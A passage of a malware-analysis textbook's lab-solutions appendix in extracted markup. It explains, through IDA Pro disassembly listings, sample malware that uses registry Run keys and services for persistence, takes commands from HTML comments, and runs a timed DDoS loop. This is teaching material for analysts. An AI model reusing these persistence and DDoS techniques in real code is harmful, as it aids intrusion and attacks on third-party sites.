    mode,* *labeled with the switch options*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Switch Options**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we will examine each of the switch options (a through e) individually.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The a option calls CreateDirectory with the parameter C:\\Temp, to create the
    path if it doesn’t already exist.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: 'The b option calls CopyFile, which takes two parameters: a source and a destination
    file. The destination is C:\\Temp\\cc.exe. The source is a parameter passed to
    this function, which, based on our earlier analysis, we know to be the program
    name (Argv[0]). Therefore, this option would copy *Lab06-03.exe* to *C:\Temp\cc.exe*.'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The c option calls DeleteFile with the parameter C:\\Temp\\cc.exe, which deletes
    that file if it exists.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The d option sets a value in the Windows registry for persistence. Specifically,
    it sets Software\Microsoft\Windows\CurrentVersion\Run\Malware to *C:\Temp\cc.exe*,
    which makes the malware start at system boot (if it is first copied to the *Temp*
    location).
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The e option sleeps for 100 seconds.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, the default option prints “Error 3.2: Not a valid command provided.”'
  prefs: []
  type: TYPE_NORMAL
- en: Having analyzed this function fully, we can combine it with our analysis from
    Lab 6-2 to gain a strong understanding of how the overall program operates.
  prefs: []
  type: TYPE_NORMAL
- en: 'We now know that the program checks for an active Internet connection using
    the if construct. If there is no valid Internet connection, the program terminates.
    Otherwise, the program attempts to download a web page that contains an embedded
    HTML comment starting with <!--. The next character is parsed from this comment
    and used in a switch statement to determine which action to take on the local
    system: delete a file, create a directory, set a registry run key, copy a file,
    or sleep for 100 seconds.'
  prefs: []
  type: TYPE_NORMAL
- en: '**510**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 6-4 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x401000 is the check Internet connection method, 0x401040 is
    the parse HTML method, 0x4012B5 is printf, and 0x401150
  prefs: []
  type: TYPE_NORMAL
- en: is the switch statement.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: A for loop has been added to the main method.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x401040 now takes a parameter and calls sprintf with **6**
  prefs: []
  type: TYPE_NORMAL
- en: the format string Internet Explorer 7.50/pma%d. It builds a User-Agent for use
    during HTTP communication using the argument passed in.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: This program will run for 1440 minutes (24 hours).
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Yes, a new User-Agent is used. It takes the form Internet Explorer 7.50/
  prefs: []
  type: TYPE_NORMAL
- en: pma%d, where %d is the number of minutes the program has been running.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: First, the program checks for an active Internet connection. If none is found,
    the program terminates. Otherwise, the program will use a unique User-Agent to
    attempt to download a web page containing a counter that tracks the number of
    minutes the program has been running. The web page downloaded contains an embedded
    HTML comment starting with <!--. The next character is parsed from this comment
    and used in a switch statement to determine the action to take on the local system.
    These are hard-coded actions, including deleting a file, creating a directory,
    setting a registry run key, copying a file, and sleeping for 100 seconds. This
    program will run for 24 hours before terminating.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'We begin by performing basic static analysis on the binary. We see one new
    string of interest that was not in Lab 6-3, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: Internet Explorer 7.50/pma%d
  prefs: []
  type: TYPE_NORMAL
- en: It looks like this program may use a dynamically generated User-Agent.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the imports, we don’t see any Windows API functions that were not
    in Lab 6-3\. When performing dynamic analysis, we also notice this User-Agent
    change when we see Internet Explorer 7.50/pma0\.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we perform more in-depth analysis with disassembly. We load the executable
    into IDA Pro and look at the main method, which is clearly struc-turally different
    from main in Lab 6-3, although many of the same functions are called. We see the
    functions 0x401000 (check Internet connection method), 0x401040 (parse HTML method),
    0x4012B5 as printf, and 0x401150 (the switch statement). You should rename these
    functions as such in IDA Pro to make them easier to analyze.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the main method in IDA Pro’s graphical view mode, we see an upward-facing
    arrow, which signifies looping. Listing 6-9L shows the loop structure.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**511**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00401248 loc_401248
  prefs: []
  type: TYPE_NORMAL
- en: 00401248 mov [ebp+var_C], 0 
  prefs: []
  type: TYPE_NORMAL
- en: 0040124F jmp short loc_40125A
  prefs: []
  type: TYPE_NORMAL
- en: '00401251 loc_401251:'
  prefs: []
  type: TYPE_NORMAL
- en: 00401251 mov eax, [ebp+var_C]
  prefs: []
  type: TYPE_NORMAL
- en: 00401254 add eax, 1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401257 mov [ebp+var_C], eax
  prefs: []
  type: TYPE_NORMAL
- en: '0040125A loc_40125A:'
  prefs: []
  type: TYPE_NORMAL
- en: 0040125A cmp [ebp+var_C], 5A0h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401261 jge short loc_4012AF
  prefs: []
  type: TYPE_NORMAL
- en: 00401263 mov ecx, [ebp+var_C] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401266 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401267 call sub_401040
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004012A2 push 60000
  prefs: []
  type: TYPE_NORMAL
- en: 004012A7 call ds:Sleep
  prefs: []
  type: TYPE_NORMAL
- en: 004012AD jmp short loc_401251 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-9L: The loop structure*'
  prefs: []
  type: TYPE_NORMAL
- en: The variable var_C is the local variable used for the loop counter. The counter
    is initialized to 0 at , jumps past the incrementing at , performs a check at
    , and loops back to the incrementor when it gets to . The presence of these
    four code sections tells us that we are looking at a for loop code construct.
    If the var_C (counter) is greater than or equal to 0x5A0 (1440), the loop will
    end. Otherwise, the code starting at  is executed. The code pushes var_C on the
    stack before calling 0x401040, and then sleeps for 1 minute before looping up
    at  and incrementing the counter by one. Therefore, this process will repeat
    for 1440 minutes, which is equal to 24 hours.
  prefs: []
  type: TYPE_NORMAL
- en: In previous labs, 0x401040 did not take a parameter, so we need to investigate
    this further. Listing 6-10L shows the start of 0x401040\.
  prefs: []
  type: TYPE_NORMAL
- en: 00401049 mov eax, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0040104C push eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040104D push offset aInt ; "Internet Explorer 7.50/pma%d"
  prefs: []
  type: TYPE_NORMAL
- en: 00401052 lea ecx, [ebp+szAgent]
  prefs: []
  type: TYPE_NORMAL
- en: 00401055 push ecx ; char *
  prefs: []
  type: TYPE_NORMAL
- en: 00401056 call _sprintf
  prefs: []
  type: TYPE_NORMAL
- en: 0040105B add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 0040105E push 0 ; dwFlags
  prefs: []
  type: TYPE_NORMAL
- en: 00401060 push 0 ; lpszProxyBypass
  prefs: []
  type: TYPE_NORMAL
- en: 00401062 push 0 ; lpszProxy
  prefs: []
  type: TYPE_NORMAL
- en: 00401064 push 0 ; dwAccessType
  prefs: []
  type: TYPE_NORMAL
- en: 00401066 lea edx, [ebp+szAgent] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401069 push edx ; lpszAgent
  prefs: []
  type: TYPE_NORMAL
- en: 0040106A call ds:InternetOpenA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 6-10L: The function at 0x401040*'
  prefs: []
  type: TYPE_NORMAL
- en: '**512**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Here, arg_0 is the only parameter, and main is the only method calling 0x401040,
    so we conclude that arg_0 is always the counter (var_C) from the main method.
    Arg_0 is pushed on the stack at , along with a format string and a destination.
    We also see that sprintf is called, which creates the string and stores it in
    the destination buffer, the local variable labeled szAgent. And szAgent is passed
    to InternetOpenA at , which means that every time the counter increases, the
    User-Agent will change. This mechanism can be used by an attacker managing and
    monitoring a web server to track how long the malware has been running.
  prefs: []
  type: TYPE_NORMAL
- en: To summarize, the program checks for an active Internet connection using the
    if construct. If no connection is found, the program terminates.
  prefs: []
  type: TYPE_NORMAL
- en: Otherwise, the program uses a unique User-Agent to attempt to download a **7**
  prefs: []
  type: TYPE_NORMAL
- en: web page containing a counter from a for loop construct. This counter contains
    the number of minutes the program has been running. The web page contains an embedded
    HTML comment and is read into an array construct of characters and compared to
    <!--. The next character is parsed from this comment and used in a switch construct
    to determine what action to take on the local system. These are hard-coded actions,
    including deleting a file, creating a directory, setting a registry run key, copying
    a file, and sleeping for 100 seconds. This program will run for 1440 minutes (24
    hours) before terminating.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 7-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: This program creates the service MalService to ensure that it runs every time
    the computer is started.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program uses a mutex to ensure that only one copy of the program is running
    at a time.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: We could search for a mutex named HGL345 and for the service MalService.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware uses the user-agent Internet Explorer 8.0 and communicates with
    *www.malwareanalysisbook.com*.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: This program waits until midnight on January 1, 2100, and then sends many requests
    to *http://www.malwareanalysisbook.com/*, presumably to conduct a distributed
    denial-of-service (DDoS) attack against the site.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: This program will never finish. It waits on a timer until the year 2100, and
    then creates 20 threads, each of which runs in an infinite loop.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: The first step in analyzing this malware in depth is to open it with IDA Pro
    or a similar tool to examine the imported function list. Many functions in the
    list provide little information because they are commonly imported by Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**513**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: all Windows executables, but a few stand out. Specifically OpenSCManager and
    CreateService indicate that this malware probably creates a service to ensure
    that it will run when the computer is restarted.
  prefs: []
  type: TYPE_NORMAL
- en: The import of StartServiceCtrlDispatcherA hints that this file actually is a
    service. The calls to InternetOpen and InternetOpenUrl tell us that this program
    might connect to a URL to download content.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we jump to the main function, which IDA Pro has identified and labeled
    _wmain at location 0x401000\. A quick glance at the code shows that it’s short
    enough to analyze completely. The _wmain function calls only one other function,
    as shown in the following listing. If the code were longer, we would need to focus
    on only the most interesting function calls based on our review of the import
    table.
  prefs: []
  type: TYPE_NORMAL
- en: 00401003 lea eax, [esp+10h+ServiceStartTable]
  prefs: []
  type: TYPE_NORMAL
- en: 00401007 mov [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ;
    "MalService"
  prefs: []
  type: TYPE_NORMAL
- en: 0040100F push eax ; lpServiceStartTable
  prefs: []
  type: TYPE_NORMAL
- en: 00401010 mov [esp+14h+ServiceStartTable.lpServiceProc], offset sub_401040
  prefs: []
  type: TYPE_NORMAL
- en: 00401018 mov [esp+14h+var_8], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401020 mov [esp+14h+var_4], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401028 call ds:StartServiceCtrlDispatcherA
  prefs: []
  type: TYPE_NORMAL
- en: 0040102E push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401030 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401032 call sub_401040
  prefs: []
  type: TYPE_NORMAL
- en: This code begins with a call to StartServiceCtrlDispatcherA at . According
    to the MSDN documentation, this function is used by a program to implement a service,
    and it is usually called immediately. The function specifies the service control
    function that the service control manager will call. Here, it specifies sub_401040
    at , which will be called after the call to StartServiceCtrlDispatcherA.
  prefs: []
  type: TYPE_NORMAL
- en: This first portion of code, including the call to StartServiceCtrlDispatcherA,
    is bookkeeping code that is necessary for programs that are run as services. It
    doesn’t tell us what the program is doing, but it does tell us that it expects
    to be run as a service.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine the sub_401040 function, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401040 sub esp, 400h
  prefs: []
  type: TYPE_NORMAL
- en: 00401046 push offset Name ; "HGL345"
  prefs: []
  type: TYPE_NORMAL
- en: 0040104B push 0 ; bInheritHandle
  prefs: []
  type: TYPE_NORMAL
- en: 0040104D push 1F0001h ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 00401052 call ds:OpenMutexA
  prefs: []
  type: TYPE_NORMAL
- en: 00401058 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040105A jz short loc_401064
  prefs: []
  type: TYPE_NORMAL
- en: 0040105C push 0 ; uExitCode
  prefs: []
  type: TYPE_NORMAL
- en: 0040105E call ds:ExitProcess
  prefs: []
  type: TYPE_NORMAL
- en: The first function call is to OpenMutexA at . The only thing of note is that
    this call is attempting to obtain a handle to the named mutex HGL345 at . If
    the call fails, the program exits.
  prefs: []
  type: TYPE_NORMAL
- en: '**514**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The next call is shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401064 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401065 push offset Name ; "HGL345"
  prefs: []
  type: TYPE_NORMAL
- en: 0040106A push 0 ; bInitialOwner
  prefs: []
  type: TYPE_NORMAL
- en: 0040106C push 0 ; lpMutexAttributes
  prefs: []
  type: TYPE_NORMAL
- en: 0040106E call ds:CreateMutexA
  prefs: []
  type: TYPE_NORMAL
- en: This code creates a mutex at  named HGL345 . The combination of these two
    mutex calls is designed to ensure that only one copy of this executable is running
    on a system at any given time. If a copy was already running, then the first call
    to OpenMutexA would have been successful, and the program would have exited.
  prefs: []
  type: TYPE_NORMAL
- en: '**7**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the code calls OpenSCManager, which opens a handle to the service control
    manager so that the program can add or modify services. The next call is to the
    GetModuleFileName function, which returns the full pathname to the currently running
    executable or a loaded DLL. The first parameter is a handle to the module for
    which the name should be retrieved, or it is NULL
  prefs: []
  type: TYPE_NORMAL
- en: to get the full pathname of the executable.
  prefs: []
  type: TYPE_NORMAL
- en: The full pathname is used by CreateServiceA to create a new service. The CreateServiceA
    call has many parameters, but the key ones are noted in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 0040109A push 0 ; lpPassword
  prefs: []
  type: TYPE_NORMAL
- en: 0040109C push 0 ; lpServiceStartName
  prefs: []
  type: TYPE_NORMAL
- en: 0040109E push 0 ; lpDependencies
  prefs: []
  type: TYPE_NORMAL
- en: 004010A0 push 0 ; lpdwTagId
  prefs: []
  type: TYPE_NORMAL
- en: 004010A2 lea ecx, [esp+414h+BinaryPathName]
  prefs: []
  type: TYPE_NORMAL
- en: 004010A6 push 0 ; lpLoadOrderGroup
  prefs: []
  type: TYPE_NORMAL
- en: 004010A8 push ecx ; lpBinaryPathName
  prefs: []
  type: TYPE_NORMAL
- en: 004010A9 push 0 ; dwErrorControl
  prefs: []
  type: TYPE_NORMAL
- en: 004010AB push 2 ; dwStartType
  prefs: []
  type: TYPE_NORMAL
- en: 004010AD push 10h ; dwServiceType
  prefs: []
  type: TYPE_NORMAL
- en: 004010AF push 2 ; dwDesiredAccess
  prefs: []
  type: TYPE_NORMAL
- en: 004010B1 push offset DisplayName ; "Malservice"
  prefs: []
  type: TYPE_NORMAL
- en: 004010B6 push offset DisplayName ; "Malservice"
  prefs: []
  type: TYPE_NORMAL
- en: 004010BB push esi ; hSCManager
  prefs: []
  type: TYPE_NORMAL
- en: 004010BC call ds:CreateServiceA
  prefs: []
  type: TYPE_NORMAL
- en: The key CreateServiceA parameters are BinaryPathName at , dwStartType at ,
    and dwServiceType at . The binary path to the executable is the same as the path
    to the currently running executable retrieved by the GetModuleFileName call. The
    GetModuleFileName call is needed because the malware may not know its directory
    or filename. By dynamically obtaining this information, it can install the service
    no matter which executable is called or where it is stored.
  prefs: []
  type: TYPE_NORMAL
- en: The MSDN documentation lists valid entries for the dwServiceType and dwStartType
    parameters. For dwStartType, the possibilities are SERVICE_BOOT_START
  prefs: []
  type: TYPE_NORMAL
- en: (0x00), SERVICE_SYSTEM_START (0x01), SERVICE_AUTO_START (0x02), SERVICE_DEMAND_START
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**515**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: (0x03), and SERVICE_DISABLED (0x04). The malware passed 0x02, which corresponds
    to SERVICE_AUTO_START, indicating that the service runs automatically on system
    startup.
  prefs: []
  type: TYPE_NORMAL
- en: A lot of code manipulates time-related structures. IDA Pro has labeled a structure
    to be a SYSTEMTIME structure, which is one of several Windows time structures.
    According to MSDN, the SYSTEMTIME structure has separate fields for the second,
    minute, hour, day, and so on, for use in specifying time. In this case, all values
    are first set to 0, and then the value for the year is set to 0x0834 at , or
    2100 in decimal. This time represents midnight on January 1, 2100\. The program
    then calls SystemTimeToFileTime between time formats.
  prefs: []
  type: TYPE_NORMAL
- en: 004010C2 xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 004010C4 lea eax, [esp+404h+DueTime]
  prefs: []
  type: TYPE_NORMAL
- en: 004010C8 mov dword ptr [esp+404h+SystemTime.wYear], edx 004010CC lea ecx, [esp+404h+SystemTime]
  prefs: []
  type: TYPE_NORMAL
- en: 004010D0 mov dword ptr [esp+404h+SystemTime.wDayOfWeek], edx 004010D4 push eax
    ; lpFileTime
  prefs: []
  type: TYPE_NORMAL
- en: 004010D5 mov dword ptr [esp+408h+SystemTime.wHour], edx 004010D9 push ecx ;
    lpSystemTime
  prefs: []
  type: TYPE_NORMAL
- en: 004010DA mov dword ptr [esp+40Ch+SystemTime.wSecond], edx 004010DE mov
  prefs: []
  type: TYPE_NORMAL
- en: [esp+40Ch+SystemTime.wYear], 834h
  prefs: []
  type: TYPE_NORMAL
- en: 004010E5 call ds:SystemTimeToFileTime
  prefs: []
  type: TYPE_NORMAL
- en: Next, the program calls CreateWaitableTimer, SetWaitableTimer, and WaitForSingleObject.
    The most important argument for our purposes is the lpDueTime argument to SetWaitableTimer.
    The argument is the FileTime returned by SystemTimeToFileTime, as shown in the
    preceding listing. The code then uses WaitForSingleObject to wait until January
    1, 2100\.
  prefs: []
  type: TYPE_NORMAL
- en: The code then loops 20 times, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401121 mov
  prefs: []
  type: TYPE_NORMAL
- en: esi, 14h
  prefs: []
  type: TYPE_NORMAL
- en: 00401126 push 0 ; lpThreadId
  prefs: []
  type: TYPE_NORMAL
- en: 00401128 push 0 ; dwCreationFlags
  prefs: []
  type: TYPE_NORMAL
- en: 0040112A push 0 ; lpParameter
  prefs: []
  type: TYPE_NORMAL
- en: 0040112C push offset StartAddress ; lpStartAddress
  prefs: []
  type: TYPE_NORMAL
- en: 00401131 push 0 ; dwStackSize
  prefs: []
  type: TYPE_NORMAL
- en: 00401133 push 0 ; lpThreadAttributes
  prefs: []
  type: TYPE_NORMAL
- en: 00401135 call edi ; CreateThread
  prefs: []
  type: TYPE_NORMAL
- en: 00401137 dec
  prefs: []
  type: TYPE_NORMAL
- en: esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401138 jnz
  prefs: []
  type: TYPE_NORMAL
- en: short loc_401126
  prefs: []
  type: TYPE_NORMAL
- en: Here, ESI is set at  as the counter to 0x14 (20 in decimal). At the end of
    the loop, ESI is decremented at , and when it hits zero at , the loop exits.
    A call to CreateThread at  has several parameters, but only one is important
    to us. The lpStartAddress parameter at  tells us which function will be used
    as the start address for the thread—labeled StartAddress in this case.
  prefs: []
  type: TYPE_NORMAL
- en: We double-click StartAddress. We see that this function calls InternetOpen to
    initialize a connection to the Internet, and then calls InternetOpenUrlA from
    within a loop, which is shown in the following code.
  prefs: []
  type: TYPE_NORMAL
- en: '**516**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040116D push 0 ; dwContext 0040116F push 80000000h ; dwFlags
  prefs: []
  type: TYPE_NORMAL
- en: 00401174 push 0 ; dwHeadersLength
  prefs: []
  type: TYPE_NORMAL
- en: 00401176 push 0 ; lpszHeaders
  prefs: []
  type: TYPE_NORMAL
- en: 00401178 push offset szUrl ; "http://www.malwareanalysisbook.com"
  prefs: []
  type: TYPE_NORMAL
- en: 0040117D push esi ; hInternet
  prefs: []
  type: TYPE_NORMAL
- en: 0040117E call edi ; InternetOpenUrlA
  prefs: []
  type: TYPE_NORMAL
- en: 00401180 jmp short loc_40116D
  prefs: []
  type: TYPE_NORMAL
- en: The jmp instruction at the end of the loop at  is an unconditional jump, which
    means that the code will never end; it will call InternetOpenUrlA  and download
    the home page of *www.malwareanalysisbook.com*  forever. And because CreateThread
    is called 20 times, 20 threads will call InternetOpenUrlA **7**
  prefs: []
  type: TYPE_NORMAL
- en: forever. Clearly, this malware is designed to launch a DDoS attack by installing
    itself on many machines. If all of the infected machines connect to the server
    at the same time (January 1, 2100), they may overload the server and make it impossible
    to access the site.
  prefs: []
  type: TYPE_NORMAL
- en: In summary, this malware uses mutexes to ensure that only one copy is running
    at a time, creates a service to ensure that it runs again when the system reboots,
    waits until January 1, 2100, and then continues to download *www.malwareanalysisbook.com*
    indefinitely.
  prefs: []
  type: TYPE_NORMAL
- en: Note that this malware doesn’t perform all of the functions required of a service.
    Normally, a service must implement functions to be stopped or paused, and it must
    change its status to let the user and OS know that the service has started. Because
    this malware does none of this, its service’s status will always display START_PENDING,
    and the service cannot be stopped while it is running. Malware often implements
    just enough functionality to achieve the author’s goals, without bothering to
    implement the entire functionality required by the specification.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you ran this lab without a virtual machine, remove the malware by entering*
    *sc delete Malservice at the command line, and then deleting the file itself.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 7-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: This program does not achieve persistence. It runs once and then exits.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program displays an advertisement web page to the user.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The program finishes executing after displaying the advertisement.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'We begin with some basic static analysis. While we don’t see any interesting
    ASCII strings, we do see one interesting Unicode string: http://www.malwareanalysisbook.com/ad.html.
    We check the imports and Solutions to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**517**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'exports of the program, and see only a few imports in addition to the standard
    imports, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: SysFreeString
  prefs: []
  type: TYPE_NORMAL
- en: SysAllocString
  prefs: []
  type: TYPE_NORMAL
- en: VariantInit
  prefs: []
  type: TYPE_NORMAL
- en: CoCreateInstance
  prefs: []
  type: TYPE_NORMAL
- en: OleInitialize
  prefs: []
  type: TYPE_NORMAL
- en: OleUninitialize
  prefs: []
  type: TYPE_NORMAL
- en: All of these functions are COM-related. The CoCreateInstance and OleInitialize
    functions in particular are required in order to use COM
  prefs: []
  type: TYPE_NORMAL
- en: functionality.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we try dynamic analysis. When we run this program, it opens Internet Explorer
    and displays an advertisement. There’s no evidence of the program modifying the
    system or installing itself to execute when the computer is restarted.
  prefs: []
  type: TYPE_NORMAL
- en: Now we can analyze the code in IDA Pro. We navigate to the _main method and
    see the code shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401003 push 0 ; pvReserved
  prefs: []
  type: TYPE_NORMAL
- en: 00401005 call ds:OleInitialize
  prefs: []
  type: TYPE_NORMAL
- en: 0040100B test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040100D jl short loc_401085
  prefs: []
  type: TYPE_NORMAL
- en: 0040100F lea eax, [esp+24h+(1) ppv]
  prefs: []
  type: TYPE_NORMAL
- en: 00401013 push eax ; ppv
  prefs: []
  type: TYPE_NORMAL
- en: 00401014 push offset riid ; riid
  prefs: []
  type: TYPE_NORMAL
- en: 00401019 push 4 ; dwClsContext
  prefs: []
  type: TYPE_NORMAL
- en: 0040101B push 0 ; pUnkOuter
  prefs: []
  type: TYPE_NORMAL
- en: 0040101D push offset rclsid ; rclsid
  prefs: []
  type: TYPE_NORMAL
- en: 00401022 call ds:CoCreateInstance
  prefs: []
  type: TYPE_NORMAL
- en: 00401028 mov eax, [esp+24h+ppv]
  prefs: []
  type: TYPE_NORMAL
- en: The first thing the malware does is initialize COM and obtain a pointer to a
    COM object with OleInitialize at  and CoCreateInstance at . The COM
  prefs: []
  type: TYPE_NORMAL
- en: object returned will be stored on the stack in a variable that IDA Pro has labeled
    ppv, as shown at . In order to determine what COM functionality is being used,
    we need to examine the interface identifier (IID) and class identifier (CLSID).
  prefs: []
  type: TYPE_NORMAL
- en: Clicking rclsid and riid shows that they are 0002DF01-0000-0000-C000-000000000046
    and D30C1661-CDAF-11D0-8A3E-00C04FC9E26E, respectively. To determine which program
    will be called, check the registry for the CLSID, or search for the IID on the
    Internet for any documentation. In this case, these values are the same identifiers
    we used in “The Component Object Model”
  prefs: []
  type: TYPE_NORMAL
- en: on page 154\. The IID is for IWebBrowser2, and the CLSID is for Internet Explorer.
  prefs: []
  type: TYPE_NORMAL
- en: As shown in the following listing, the COM object returned by CoCreateInstance
    is accessed a few instructions later at .
  prefs: []
  type: TYPE_NORMAL
- en: '**518**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040105C mov eax, [esp+28h+ppv]
  prefs: []
  type: TYPE_NORMAL
- en: 00401060 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401061 lea ecx, [esp+2Ch+pvarg]
  prefs: []
  type: TYPE_NORMAL
- en: 00401065 mov edx, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 00401067 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401068 lea ecx, [esp+30h+pvarg]
  prefs: []
  type: TYPE_NORMAL
- en: 0040106C push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040106D lea ecx, [esp+34h+var_10]
  prefs: []
  type: TYPE_NORMAL
- en: 00401071 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401072 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401073 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401074 call dword ptr [edx+2Ch]
  prefs: []
  type: TYPE_NORMAL
- en: '**7**'
  prefs: []
  type: TYPE_NORMAL
- en: Following this instruction, EAX points to the location of the COM
  prefs: []
  type: TYPE_NORMAL
- en: object. At , EAX is dereferenced and EDX points to the beginning of the COM
    object itself. At , the function at an offset of +0x2C from the object is called.
    As discussed in the chapter, the offset 0x2C for the IWebBrowser2 interface is
